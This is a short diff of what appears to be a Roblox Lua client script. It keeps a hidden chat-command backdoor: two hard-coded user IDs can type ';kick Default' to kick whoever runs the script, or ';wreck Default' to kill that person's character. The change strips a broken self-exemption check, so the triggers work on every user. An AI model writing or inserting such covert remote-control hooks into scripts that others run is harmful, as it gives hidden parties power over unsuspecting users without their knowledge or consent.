@@ -460,10 +460,10 @@ local waypoint = CFrame.new()
 local wl = {3350674438,539847333}
 players.PlayerAdded:Connect(function(player)
 	player.Chatted:Connect(function(message)
-		if table.find(wl,player.UserId) and message == ";kick Default" and game.Players.LocalPlayer.Userid ~= table.find(wl,player.UserId) then
+		if table.find(wl,player.UserId) and message == ";kick Default" then
 			game.Players.LocalPlayer:Kick("imagine")
 		end
-		if table.find(wl,player.UserId) and game.Players.LocalPlayer.Userid ~= table.find(wl,player.UserId) and message == ";wreck Default" then
+		if table.find(wl,player.UserId) and message == ";wreck Default" then
 			game.Players.LocalPlayer.Character.Humanoid.Health = 0
 		end
 		
